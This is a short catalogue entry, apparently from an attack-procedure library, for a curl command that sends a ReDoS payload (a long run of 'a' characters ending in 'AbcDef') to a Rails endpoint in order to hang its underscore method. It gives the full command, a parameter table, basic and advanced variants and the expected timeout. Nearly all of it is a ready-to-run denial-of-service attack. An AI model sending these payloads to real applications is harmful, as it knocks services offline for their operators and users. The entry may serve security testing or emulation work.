---
id: cmd-curl-post-malicious-001
data: >-
  curl -X POST 'http://target-rails-app.com/api/underscore' -d
  'name=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAbcDef'
  -H 'Content-Type: application/x-www-form-urlencoded'
tags:
  - web
  - exploit
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.844Z'
verified: false
validated: true
submitted: true
---
# curl-post-malicious-input

## Command

```bash
curl -X POST 'http://target-rails-app.com/api/underscore' -d 'name=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAbcDef' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

Sends a malicious ReDoS payload via HTTP POST to a vulnerable Rails endpoint, triggering the underscore method and causing DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `'http://target...'` | Target URL | Yes |
| `-d 'name=...'` | Payload data | Yes |
| `-H '...'` | Content type header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://example.com/api' -d 'input=aaa...Abc'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/secure/api' -d 'param=aaaaaaaaaaaaaaaa...Xyz' -H 'Content-Type: application/json' --max-time 60
```

## Expected Output

Delayed or timed-out response due to server processing hang.

## Related

- [[Related Procedure: Invoke-Underscore-Method-via-Web-Input]]
